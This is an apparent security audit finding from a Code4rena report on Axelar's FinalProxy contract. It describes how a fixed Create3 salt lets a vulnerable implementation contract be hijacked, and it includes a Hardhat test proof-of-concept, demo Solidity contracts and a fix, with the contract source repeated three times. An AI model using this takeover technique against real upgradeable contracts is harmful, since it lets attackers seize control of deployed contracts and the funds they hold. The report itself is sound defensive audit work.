{
  "Title": "[L-01] `FinalProxy` can be hijacked by vulnerable implementation contract",
  "Content": "\n`FinalProxy` is a proxy that can be upgraded, but if `owner` calls `finalUpgrade` it will [deploy the final upgrade using `Create3`](https://github.com/code-423n4/2023-07-axelar/blob/main/contracts/gmp-sdk/upgradable/FinalProxy.sol#L79-L83) and it can no longer be upgraded. To determine if it has gotten the final upgrade or not, the function `_finalImplementation` is called:\n\nhttps://github.com/code-423n4/2023-07-axelar/blob/main/contracts/gmp-sdk/upgradable/FinalProxy.sol#L18\n\nhttps://github.com/code-423n4/2023-07-axelar/blob/main/contracts/gmp-sdk/upgradable/FinalProxy.sol#L57-L64\n\n```solidity\nFile: gmp-sdk/upgradable/FinalProxy.sol\n\n18:    bytes32 internal constant FINAL_IMPLEMENTATION_SALT = keccak256('final-implementation');\n\n...\n\n57:    function _finalImplementation() internal view virtual returns (address implementation_) {\n58:        /**\n59:         * @dev Computing the address is cheaper than using storage\n60:         */\n61:        implementation_ = Create3.deployedAddress(address(this), FINAL_IMPLEMENTATION_SALT);\n62:\n63:        if (implementation_.code.length == 0) implementation_ = address(0);\n64:    }\n```\n\nThe issue is that if the implementation supports deploying with `Create3`, a user could use the salt (`keccak256('final-implementation')`) and deploy a final implementation without calling `finalImplementation`, since `Create3` only uses `msg.sender` and `salt` to determine the address.\n\n`InterchainTokenService`, which is the only implementation in scope using `FinalProxy`, does however not appear to be vulnerable to this, since all the salts used for deploys are calculated, not supplied. But future implementations/other contracts using `FinalProxy` might be.\n\n### PoC\n\nTest in `proxy.js`:\n```javascript\n        it('vulnerable FinalProxy implementation', async () => {\n            const vulnerableDeployerFactory = await ethers.getContractFactory('VulnerableDeployer', owner);\n            const maliciousContractFactory = await ethers.getContractFactory('MaliciousContract', owner);\n            const vulnerableImpl = await vulnerableDeployerFactory.deploy().then((d) => d.deployed());\n\n            const proxy = await finalProxyFactory.deploy(vulnerableImpl.address, owner.address, '0x').then((d) => d.deployed());\n            expect(await proxy.isFinal()).to.be.false;\n\n            const vulnerable = new Contract(await proxy.address, VulnerableDeployer.abi, owner);\n\n            // steal final-implementation salt\n            const salt = keccak256(toUtf8Bytes('final-implementation'));\n\n            // someone deploys to the final-implementation address\n            const bytecode = await maliciousContractFactory.getDeployTransaction().data;\n            await vulnerable.vulnerableDeploy(salt,bytecode);\n\n            // proxy is final without calling finalUpgrade\n            expect(await proxy.isFinal()).to.be.true;\n            const malicious = new Contract(await proxy.address, MaliciousContract.abi, owner);\n            expect(await malicious.maliciousCode()).to.equal(4);\n        });\n```\n\n`VulnerableDeployer.sol`:\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\nimport { Create3 } from '../deploy/Create3.sol';\n\ncontract MaliciousContract {\n\n    function setup(bytes calldata params) external {}\n    \n    function maliciousCode() public pure returns(uint256) {\n        return 4;\n    }\n}\n\ncontract VulnerableDeployer {\n\n    function setup(bytes calldata params) external {}\n    \n    function vulnerableDeploy(bytes32 salt, bytes memory bytecode) public returns(address ) {\n        return Create3.deploy(salt, bytecode); \n    }\n}\n```\n\n### Recommendation\n\nHave the user deploy the final implementation and then upgrade to it without using `Create3`. That way, a vulnerable implementation contract cannot be abused and taken over.\n\n",
  "Impact": "LOW",
  "Source": "https://code4rena.com/reports/2023-07-axelar",
  "Code": [
    {
      "filename": "contracts/gmp-sdk/upgradable/FinalProxy.sol",
      "content": "// SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.0;\n\nimport { IProxy } from '../interfaces/IProxy.sol';\nimport { IFinalProxy } from '../interfaces/IFinalProxy.sol';\nimport { Create3 } from '../deploy/Create3.sol';\nimport { BaseProxy } from './BaseProxy.sol';\nimport { Proxy } from './Proxy.sol';\n\n/**\n * @title FinalProxy Contract\n * @notice The FinalProxy contract is a proxy that can be upgraded to a final implementation\n * that uses less gas than regular proxy calls. It inherits from the Proxy contract and implements\n * the IFinalProxy interface.\n */\ncontract FinalProxy is Proxy, IFinalProxy {\n    bytes32 internal constant FINAL_IMPLEMENTATION_SALT = keccak256('final-implementation');\n\n    /**\n     * @dev Constructs a FinalProxy contract with a given implementation address, owner, and setup parameters.\n     * @param implementationAddress The address of the implementation contract\n     * @param owner The owner of the proxy contract\n     * @param setupParams Parameters to setup the implementation contract\n     */\n    constructor(\n        address implementationAddress,\n        address owner,\n        bytes memory setupParams\n    ) Proxy(implementationAddress, owner, setupParams) {}\n\n    /**\n     * @dev The final implementation address takes less gas to compute than reading an address from storage. That makes FinalProxy\n     * more efficient when making delegatecalls to the implementation (assuming it is the final implementation).\n     * @return implementation_ The address of the final implementation if it exists, otherwise the current implementation\n     */\n    function implementation() public view override(BaseProxy, IProxy) returns (address implementation_) {\n        implementation_ = _finalImplementation();\n        if (implementation_ == address(0)) {\n            implementation_ = super.implementation();\n        }\n    }\n\n    /**\n     * @dev Checks if the final implementation has been deployed.\n     * @return bool True if the final implementation exists, false otherwise\n     */\n    function isFinal() public view returns (bool) {\n        return _finalImplementation() != address(0);\n    }\n\n    /**\n     * @dev Computes the final implementation address.\n     * @return implementation_ The address of the final implementation, or the zero address if the final implementation\n     * has not yet been deployed\n     */\n    function _finalImplementation() internal view virtual returns (address implementation_) {\n        /**\n         * @dev Computing the address is cheaper than using storage\n         */\n        implementation_ = Create3.deployedAddress(address(this), FINAL_IMPLEMENTATION_SALT);\n\n        if (implementation_.code.length == 0) implementation_ = address(0);\n    }\n\n    /**\n     * @dev Upgrades the proxy to a final implementation.\n     * @param bytecode The bytecode of the final implementation contract\n     * @param setupParams The parameters to setup the final implementation contract\n     * @return finalImplementation_ The address of the final implementation contract\n     */\n    function finalUpgrade(bytes memory bytecode, bytes calldata setupParams) public returns (address finalImplementation_) {\n        address owner;\n        assembly {\n            owner := sload(_OWNER_SLOT)\n        }\n        if (msg.sender != owner) revert NotOwner();\n\n        finalImplementation_ = Create3.deploy(FINAL_IMPLEMENTATION_SALT, bytecode);\n        if (setupParams.length != 0) {\n            (bool success, ) = finalImplementation_.delegatecall(abi.encodeWithSelector(BaseProxy.setup.selector, setupParams));\n            if (!success) revert SetupFailed();\n        }\n    }\n}"
    },
    {
      "filename": "contracts/gmp-sdk/upgradable/FinalProxy.sol",
      "content": "// SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.0;\n\nimport { IProxy } from '../interfaces/IProxy.sol';\nimport { IFinalProxy } from '../interfaces/IFinalProxy.sol';\nimport { Create3 } from '../deploy/Create3.sol';\nimport { BaseProxy } from './BaseProxy.sol';\nimport { Proxy } from './Proxy.sol';\n\n/**\n * @title FinalProxy Contract\n * @notice The FinalProxy contract is a proxy that can be upgraded to a final implementation\n * that uses less gas than regular proxy calls. It inherits from the Proxy contract and implements\n * the IFinalProxy interface.\n */\ncontract FinalProxy is Proxy, IFinalProxy {\n    bytes32 internal constant FINAL_IMPLEMENTATION_SALT = keccak256('final-implementation');\n\n    /**\n     * @dev Constructs a FinalProxy contract with a given implementation address, owner, and setup parameters.\n     * @param implementationAddress The address of the implementation contract\n     * @param owner The owner of the proxy contract\n     * @param setupParams Parameters to setup the implementation contract\n     */\n    constructor(\n        address implementationAddress,\n        address owner,\n        bytes memory setupParams\n    ) Proxy(implementationAddress, owner, setupParams) {}\n\n    /**\n     * @dev The final implementation address takes less gas to compute than reading an address from storage. That makes FinalProxy\n     * more efficient when making delegatecalls to the implementation (assuming it is the final implementation).\n     * @return implementation_ The address of the final implementation if it exists, otherwise the current implementation\n     */\n    function implementation() public view override(BaseProxy, IProxy) returns (address implementation_) {\n        implementation_ = _finalImplementation();\n        if (implementation_ == address(0)) {\n            implementation_ = super.implementation();\n        }\n    }\n\n    /**\n     * @dev Checks if the final implementation has been deployed.\n     * @return bool True if the final implementation exists, false otherwise\n     */\n    function isFinal() public view returns (bool) {\n        return _finalImplementation() != address(0);\n    }\n\n    /**\n     * @dev Computes the final implementation address.\n     * @return implementation_ The address of the final implementation, or the zero address if the final implementation\n     * has not yet been deployed\n     */\n    function _finalImplementation() internal view virtual returns (address implementation_) {\n        /**\n         * @dev Computing the address is cheaper than using storage\n         */\n        implementation_ = Create3.deployedAddress(address(this), FINAL_IMPLEMENTATION_SALT);\n\n        if (implementation_.code.length == 0) implementation_ = address(0);\n    }\n\n    /**\n     * @dev Upgrades the proxy to a final implementation.\n     * @param bytecode The bytecode of the final implementation contract\n     * @param setupParams The parameters to setup the final implementation contract\n     * @return finalImplementation_ The address of the final implementation contract\n     */\n    function finalUpgrade(bytes memory bytecode, bytes calldata setupParams) public returns (address finalImplementation_) {\n        address owner;\n        assembly {\n            owner := sload(_OWNER_SLOT)\n        }\n        if (msg.sender != owner) revert NotOwner();\n\n        finalImplementation_ = Create3.deploy(FINAL_IMPLEMENTATION_SALT, bytecode);\n        if (setupParams.length != 0) {\n            (bool success, ) = finalImplementation_.delegatecall(abi.encodeWithSelector(BaseProxy.setup.selector, setupParams));\n            if (!success) revert SetupFailed();\n        }\n    }\n}"
    },
    {
      "filename": "contracts/gmp-sdk/upgradable/FinalProxy.sol",
      "content": "// SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.0;\n\nimport { IProxy } from '../interfaces/IProxy.sol';\nimport { IFinalProxy } from '../interfaces/IFinalProxy.sol';\nimport { Create3 } from '../deploy/Create3.sol';\nimport { BaseProxy } from './BaseProxy.sol';\nimport { Proxy } from './Proxy.sol';\n\n/**\n * @title FinalProxy Contract\n * @notice The FinalProxy contract is a proxy that can be upgraded to a final implementation\n * that uses less gas than regular proxy calls. It inherits from the Proxy contract and implements\n * the IFinalProxy interface.\n */\ncontract FinalProxy is Proxy, IFinalProxy {\n    bytes32 internal constant FINAL_IMPLEMENTATION_SALT = keccak256('final-implementation');\n\n    /**\n     * @dev Constructs a FinalProxy contract with a given implementation address, owner, and setup parameters.\n     * @param implementationAddress The address of the implementation contract\n     * @param owner The owner of the proxy contract\n     * @param setupParams Parameters to setup the implementation contract\n     */\n    constructor(\n        address implementationAddress,\n        address owner,\n        bytes memory setupParams\n    ) Proxy(implementationAddress, owner, setupParams) {}\n\n    /**\n     * @dev The final implementation address takes less gas to compute than reading an address from storage. That makes FinalProxy\n     * more efficient when making delegatecalls to the implementation (assuming it is the final implementation).\n     * @return implementation_ The address of the final implementation if it exists, otherwise the current implementation\n     */\n    function implementation() public view override(BaseProxy, IProxy) returns (address implementation_) {\n        implementation_ = _finalImplementation();\n        if (implementation_ == address(0)) {\n            implementation_ = super.implementation();\n        }\n    }\n\n    /**\n     * @dev Checks if the final implementation has been deployed.\n     * @return bool True if the final implementation exists, false otherwise\n     */\n    function isFinal() public view returns (bool) {\n        return _finalImplementation() != address(0);\n    }\n\n    /**\n     * @dev Computes the final implementation address.\n     * @return implementation_ The address of the final implementation, or the zero address if the final implementation\n     * has not yet been deployed\n     */\n    function _finalImplementation() internal view virtual returns (address implementation_) {\n        /**\n         * @dev Computing the address is cheaper than using storage\n         */\n        implementation_ = Create3.deployedAddress(address(this), FINAL_IMPLEMENTATION_SALT);\n\n        if (implementation_.code.length == 0) implementation_ = address(0);\n    }\n\n    /**\n     * @dev Upgrades the proxy to a final implementation.\n     * @param bytecode The bytecode of the final implementation contract\n     * @param setupParams The parameters to setup the final implementation contract\n     * @return finalImplementation_ The address of the final implementation contract\n     */\n    function finalUpgrade(bytes memory bytecode, bytes calldata setupParams) public returns (address finalImplementation_) {\n        address owner;\n        assembly {\n            owner := sload(_OWNER_SLOT)\n        }\n        if (msg.sender != owner) revert NotOwner();\n\n        finalImplementation_ = Create3.deploy(FINAL_IMPLEMENTATION_SALT, bytecode);\n        if (setupParams.length != 0) {\n            (bool success, ) = finalImplementation_.delegatecall(abi.encodeWithSelector(BaseProxy.setup.selector, setupParams));\n            if (!success) revert SetupFailed();\n        }\n    }\n}"
    }
  ]
}